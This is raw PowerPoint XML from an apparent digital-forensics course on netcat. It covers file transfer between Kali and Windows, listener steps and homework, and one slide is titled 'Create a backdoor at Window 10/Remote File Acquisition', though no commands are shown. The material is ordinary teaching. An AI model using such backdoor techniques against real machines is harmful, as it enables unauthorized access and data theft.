            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Slide Number Placeholder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1" y="6470651"/>
            <a:ext cx="732367" cy="387349"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:fld id="{00000000-1234-1234-1234-123412341234}" type="slidenum">
              <a:rPr lang="en" smtClean="0"/>
              <a:pPr algn="ctr"/>
              <a:t>9</a:t>
            </a:fld>
            <a:endParaRPr lang="en"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2518429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Chatting</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1127425" y="1443234"/>
            <a:ext cx="8795217" cy="508754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BE5B3CB-0C46-5BFC-C965-C3B23702C669}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="10036847" y="3735279"/>
              <a:ext cx="4320" cy="5760"/>
            </p14:xfrm>
          </p:contentPart>
        </mc:Choice>
        <mc:Fallback xmlns="">
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="2" name="Ink 1">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DBE5B3CB-0C46-5BFC-C965-C3B23702C669}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId4"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10027847" y="3726639"/>
                <a:ext cx="21960" cy="23400"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
            </p:spPr>
          </p:pic>
        </mc:Fallback>
      </mc:AlternateContent>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="TextBox 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A6AA1961-32DD-C1D1-3792-DED9BD0172E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6142055" y="1927750"/>
            <a:ext cx="4922520" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent4">
              <a:lumMod val="20000"/>
              <a:lumOff val="80000"/>
            </a:schemeClr>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>By default, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>netcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> does not save the incoming data to a file; it simply outputs the received data to the terminal (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>stdout</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0DA33025-5B5F-E983-E7B5-87A24285727B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3185160" y="925162"/>
            <a:ext cx="7040880" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> By default, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>netcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> uses the TCP (Transmission Control Protocol) protocol</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2416641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Forensic Data Transfer</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{E24DD715-7292-4FAD-A484-09D5D92FAB07}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>11</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="928654" y="1690688"/>
            <a:ext cx="8953541" cy="3706976"/>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BD06D31-7CAC-5B43-D03B-877056D08B72}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="6499847" y="5989599"/>
              <a:ext cx="4320" cy="360"/>
            </p14:xfrm>
          </p:contentPart>
        </mc:Choice>
        <mc:Fallback xmlns="">
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="2" name="Ink 1">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FBD06D31-7CAC-5B43-D03B-877056D08B72}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId4"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="6490847" y="5980599"/>
                <a:ext cx="219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CCE866D0-3FE2-6B52-B626-F1397DA2AD3D}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="6641327" y="6123879"/>
              <a:ext cx="360" cy="360"/>
            </p14:xfrm>
          </p:contentPart>
        </mc:Choice>
        <mc:Fallback xmlns="">
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="6" name="Ink 5">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CCE866D0-3FE2-6B52-B626-F1397DA2AD3D}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId6"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="6632687" y="6115239"/>
                <a:ext cx="18000" cy="18000"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
            </p:spPr>
          </p:pic>
        </mc:Fallback>
      </mc:AlternateContent>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F2CBFA9D-1EF1-A0A6-F93C-9042E856DF97}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7299960" y="2095500"/>
            <a:ext cx="1373581" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent4">
              <a:lumMod val="20000"/>
              <a:lumOff val="80000"/>
            </a:schemeClr>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>step 1: listen</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FABD279D-7416-CF5B-70E5-29EC7570EB41}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7109460" y="4394955"/>
            <a:ext cx="3794372" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent4">
              <a:lumMod val="20000"/>
              <a:lumOff val="80000"/>
            </a:schemeClr>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>step 2: sent to listener’s input device 0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="TextBox 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8FA1BF48-4DB7-4B0D-8925-A1EFE6E4188F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="990600" y="4922520"/>
            <a:ext cx="2407262" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent4">
              <a:lumMod val="20000"/>
              <a:lumOff val="80000"/>
            </a:schemeClr>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>step 3: stop the process</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="311612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Your work</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Subtitle 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1" y="6297084"/>
            <a:ext cx="732367" cy="524933"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{E24DD715-7292-4FAD-A484-09D5D92FAB07}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>12</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3933795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Goal : Communication between two machines</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="40116" y="2118247"/>
            <a:ext cx="12111769" cy="2621507"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="684404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Goal</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="997233" y="1737116"/>
            <a:ext cx="8187200" cy="3147304"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Send files from Kali to Windows 10</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Solution</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Zenmap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>netcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is integrated into </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Zenmap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3211001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fld id="{E24DD715-7292-4FAD-A484-09D5D92FAB07}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>15</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="757675" y="1053703"/>
            <a:ext cx="10258981" cy="476350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3BF08B5-58DD-CB09-FD46-A825C6314B9A}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="6202127" y="6060519"/>
              <a:ext cx="1440" cy="360"/>
            </p14:xfrm>
          </p:contentPart>
        </mc:Choice>
        <mc:Fallback xmlns="">
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="2" name="Ink 1">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{63BF08B5-58DD-CB09-FD46-A825C6314B9A}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId4"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="6193127" y="6051519"/>
                <a:ext cx="19080" cy="18000"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
            </p:spPr>
          </p:pic>
        </mc:Fallback>
      </mc:AlternateContent>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2427580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idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{E24DD715-7292-4FAD-A484-09D5D92FAB07}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>16</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Bent-Up Arrow 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="6948606" y="3353537"/>
            <a:ext cx="1035004" cy="1131488"/>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7" name="Picture 6"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6360017" y="4733552"/>
            <a:ext cx="5068007" cy="1092352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-1" y="1"/>
            <a:ext cx="6399252" cy="4140017"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="TextBox 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2E051C2F-9025-48D3-8554-B0E0E3B004AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7169124" y="2135515"/>
            <a:ext cx="4623638" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This slide: send a file from Linux to Win</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Your homework is: sent a file from Win to Linux</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EDFF498D-D4F3-23C4-B8E5-384CCA35164D}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="10901567" y="1395999"/>
              <a:ext cx="360" cy="360"/>
            </p14:xfrm>
          </p:contentPart>
        </mc:Choice>
        <mc:Fallback xmlns="">
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="4" name="Ink 3">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EDFF498D-D4F3-23C4-B8E5-384CCA35164D}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId5"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="10892567" y="1387359"/>
                <a:ext cx="18000" cy="18000"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
            </p:spPr>
          </p:pic>
        </mc:Fallback>
      </mc:AlternateContent>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="156228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a:t>Create a backdoor at Window 10/Remote File Acquisition</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Subtitle 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1" y="6297084"/>
            <a:ext cx="732367" cy="524933"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{E24DD715-7292-4FAD-A484-09D5D92FAB07}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>17</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>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6C1D5EF-A478-2D77-CFC4-CB7513BD80CE}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="5897369" y="1658403"/>
              <a:ext cx="360" cy="360"/>
            </p14:xfrm>
          </p:contentPart>
        </mc:Choice>
        <mc:Fallback xmlns="">
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="2" name="Ink 1">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{96C1D5EF-A478-2D77-CFC4-CB7513BD80CE}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId3"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="5888369" y="1649763"/>
                <a:ext cx="18000" cy="18000"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
            </p:spPr>
          </p:pic>
        </mc:Fallback>
      </mc:AlternateContent>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1035595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BC4124-87C8-4743-8E1C-273BB86DC97E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Same Goal</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7032E3DA-7F7C-4137-9921-D28D7A17B054}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
